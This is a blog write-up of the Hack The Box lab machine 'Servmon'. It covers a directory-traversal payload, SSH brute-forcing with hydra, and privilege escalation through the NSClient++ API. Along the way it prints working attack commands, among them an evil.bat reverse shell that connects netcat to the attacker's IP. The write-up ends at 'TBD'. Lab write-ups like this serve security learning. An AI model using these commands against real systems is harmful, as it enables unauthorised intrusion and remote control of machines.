---
layout: post
title: "HTB: Servmon"
tags: htb windows
---

Servmon had retired from HTB about a week ago, but due to work and study matters I hadn't been able to find the time (and mood) to really do the write-up for this box. But I must persevere to maintain a habit of writing, so here goes.

### Recce

As always, we begin with an nmap - a few ports are open for us, most interestingly port 21,80,8443, plus the usual windows SMB ports 135,139 and 445.
```
# Nmap 7.80 scan initiated Tue Apr 14 01:36:29 2020 as: nmap -v -sC -sV -oN initial.txt servmon.htb
Nmap scan report for servmon.htb (10.10.10.184)
Host is up (0.31s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                  
|_01-18-20  12:05PM       <DIR>          Users                                                                                          
| ftp-syst:                                                                                                                             
|_  SYST: Windows_NT                                                                                                                    
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)                                                                     
| ssh-hostkey:                                                                                                                          
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)                                                                          
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|_    "configure" (read recompile)
| http-methods: 
|_  Supported Methods: GET
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03 0c40 5b7a 0f6d d8c8 78e3 cba7 38b4
|_SHA-1: 7083 bd82 b4b0 f9c0 cc9c 5019 2f9f 9291 4694 8334
|_ssl-date: TLS randomness does not represent time
```

### port 80

Visit port 80 and immediately you see a page with a title "NVMS-1000".

Search google for an exploit related to that term and you very quickly find a [directory traversal exploit](https://www.exploit-db.com/exploits/48311). We try it out with a default windows file `c:\windows\win.ini` and see that it actually works:

At this juncture you could try to look for registry files that contains SAM or SYSTEM files to perform a `samdump2` to dump hashes, but you'd be disappointed. (If you have success here, great!)
  
  
So instead, let's just look at the next interesting port - port 21.

### port 21

Nmap had already told us earlier that the FTP here allows anonymous login, so we do that:
```
kali@kali:~/htb/boxes/servmon/nmap$ ftp servmon.htb
Connected to servmon.htb.
220 Microsoft FTP Service
Name (servmon.htb:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       <DIR>          Users
226 Transfer complete.
ftp> 
```
If we did a `dir` command, we see a `Users` folder. Let's look inside:
```
ftp> cd Users
d250 CWD command successful.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
226 Transfer complete.
```
We see users `Nadine` and `Nathan`. Great, we're getting somewhere. Look inside `Nadine`, and we find something interesting...
```
ftp> cd Nadine
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:08PM                  174 Confidential.txt
226 Transfer complete.
```
Anything that's named like that has got to be worth checking out. `Get` the file and read it...
```
ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
174 bytes received in 0.36 secs (0.4712 kB/s)
ftp> exit
221 Goodbye.
kali@kali:~/htb/boxes/servmon$ cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```
We get a few clues - user `Nadine` left a file on `Nathan`'s `Desktop` folder called `Passwords.txt`! Remember we had the directory traversal exploit earlier on port 80 - let's use that!
  
  
In newer windows versions, home folders are usually found in `C:\Users\<Usernames>`, so this means we can look in `C:\Users\Nathan\Desktop\Passwords.txt`. Using directory traversal, our payload becomes:
```
http://servmon.htb/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fusers%2fnathan%2fdesktop%2fpasswords.txt
```
```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```
Woohoo! We got them passwords, now let's try them! 

### Shell as Nadine

Remember earlier Nmap had told us there was a port 22 (SSH) on the box. Let's save our passwords in a file called `passwords.txt` and use `hydra` and throw them passwords at port SSH, like this:
```
hydra -l nadine -P passwords.txt servmon.htb ssh
```
Notice we're targeting `Nadine` - just turns out the passwords worked for her, instead of `Nathan`.
```
kali@kali:~/htb/boxes/servmon/ssh$ hydra -l nadine -P passwords.txt servmon.htb ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-26 07:50:04
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ssh://servmon.htb:22/
[22][ssh] host: servmon.htb   login: nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-26 07:50:11
```
We got our password for `Nadine`, now let's ssh in:
```
sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@servmon.htb 
```
```
kali@kali:~/htb/boxes/servmon/ssh$ sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@servmon.htb
Microsoft Windows [Version 10.0.18363.752]          
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>
```
At this point you could do a `winpeas.exe` to automatically enumerate the box. But if we remembered our clues earlier, we could notice that there's a `NSClient++` in the `Program Files` directory on the box, and remember that in the nmap scan, there was an `NSClient++` service open at port 8443.
```
nadine@SERVMON C:\Users\Nadine>dir c:\"program files"  
 Volume in drive C has no label.                                               
 Volume Serial Number is 728C-D22C                                             
                                                                               
 Directory of c:\program files                                                 
                                                                               
08/04/2020  23:21    <DIR>          .                                          
08/04/2020  23:21    <DIR>          ..                                         
08/04/2020  23:21    <DIR>          Common Files                               
08/04/2020  23:18    <DIR>          Internet Explorer                          
19/03/2019  05:52    <DIR>          ModifiableWindowsApps                      
16/01/2020  19:11    <DIR>          NSClient++                                 
08/04/2020  23:09    <DIR>          Reference Assemblies                       
08/04/2020  23:21    <DIR>          UNP                                        
14/01/2020  09:14    <DIR>          VMware                                     
08/04/2020  22:31    <DIR>          Windows Defender                           
08/04/2020  22:45    <DIR>          Windows Defender Advanced Threat Protection
19/03/2019  05:52    <DIR>          Windows Mail                               
19/03/2019  12:43    <DIR>          Windows Multimedia Platform                
19/03/2019  06:02    <DIR>          Windows NT                                 
19/03/2019  12:43    <DIR>          Windows Photo Viewer                       
19/03/2019  12:43    <DIR>          Windows Portable Devices                   
19/03/2019  05:52    <DIR>          Windows Security                           
19/03/2019  05:52    <DIR>          WindowsPowerShell                          
               0 File(s)              0 bytes                                  
              18 Dir(s)  27,870,027,776 bytes free
```
### Priv with NSClient++
Google `NSClient++` exploit and [this should come up early in your results](https://www.exploit-db.com/exploits/46802).
  
  
Let's follow the steps accordingly - first, we grab the web administrator's password with `nscp.exe`:
```
nadine@SERVMON c:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT
```
Next, we need to login `NSClient++` at port 8443 and enable `CheckExternalScripts` and `Scheduler` - but if you tried to access port 8443, you'll see that you're denied access. This is because if you checked the configuration file `nsclient.ini`, you'll see that the server is configured to allow only localhost access:
```
nadine@SERVMON c:\Program Files\NSClient++>type nsclient.ini
´╗┐# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
```
We could do port forwarding to overcome this, but for the first few steps we can save ourselves from the prolonged agony, by doing what we need to do from the box itself via [API and a bit of guesswork](https://docs.nsclient.org/api/):
```
curl -s -k -u admin:ew2x6SsGTxjRwXOT https://localhost:8443/api/v1/modules/CheckExternalScripts/commands/load
curl -s -k -u admin:ew2x6SsGTxjRwXOT https://localhost:8443/api/v1/modules/Scheduler/commands/load
```
```
nadine@SERVMON c:\Program Files\NSClient++>curl -s -k -u admin:ew2x6SsGTxjRwXOT https://localhost:8443/api/v1/modules/CheckExternalScrip
ts/commands/load
Success load CheckExternalScripts
nadine@SERVMON c:\Program Files\NSClient++>curl -s -k -u admin:ew2x6SsGTxjRwXOT https://localhost:8443/api/v1/modules/Scheduler/commands
/load
Success load Scheduler
```
Next, we need to upload `nc.exe` and an `evil.bat` that contains:
```
@echo off
c:\temp\nc.exe 10.10.14.64 443 -e cmd.exe
```
Prepare both files on kali and upload them easily with impacket's `smbserver`:
```
kali@kali:~/htb/boxes/servmon$ ls smb
evil.bat  nc.exe
kali@kali:~/htb/boxes/servmon$ sudo smbserver.py share smb -smb2support
[sudo] password for kali: 
Impacket v0.9.21.dev1+20200225.153700.afe746d2 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
```
nadine@SERVMON c:\Temp>copy \\10.10.14.64\share\nc.exe .
        1 file(s) copied.

nadine@SERVMON c:\Temp>copy \\10.10.14.64\share\evil.bat .
        1 file(s) copied.
```
We got our files uploaded, now let's load them on the `NSClient++` server again using the API (note: do this in `c:\temp`):
```
curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary @evil.bat
```
```
nadine@SERVMON c:\Temp>curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/evil.bat --data-bin
ary @evil.bat
Added evil as scripts\evil.bat
```
Now we need to add running our `evil.bat` script to the scheduler on `NSClient++`, now over here I hit a snag because I couldn't find the API for this... to get around that problem, we get back to port forwarding:
```
sshpass -p 'L1k3B1gBut7s@W0rk' ssh -N -L 4444:127.0.0.1:8443 nadine@servmon.htb
```
This sets up our local port `4444` to be forwarded to `127.0.0.1:8443` at `servmon.htb`, which means we can access `NSClient++` as a 'local' user on our kali at `https://localhost:4444`:
<picture>
  
  
Things are painfully slow at this stage and you might need to redo the entire privesc process repeatedly. For reference, these are the general steps:

- 1. Activate scheduler and external scripts via API
- 2. Settings > external scripts > scripts > /evil + "command" : "c:\temp\evil.bat"
- 3. Settings > scheduler > schedules > /evil + "command" : "evil"
- 4. Settings > scheduler > schedules > /evil + "interval" : "1m"
  
  
If you managed to get it all set up, listen on port 443:
```
sudo nc -lvnp 443
```
Reload NSClient++ via API:
```
curl -k -s -H 'password:ew2x6SsGTxjRwXOT' 'https://localhost:8443/core/reload'
```
Wait for about a minute...
```
TBD
```
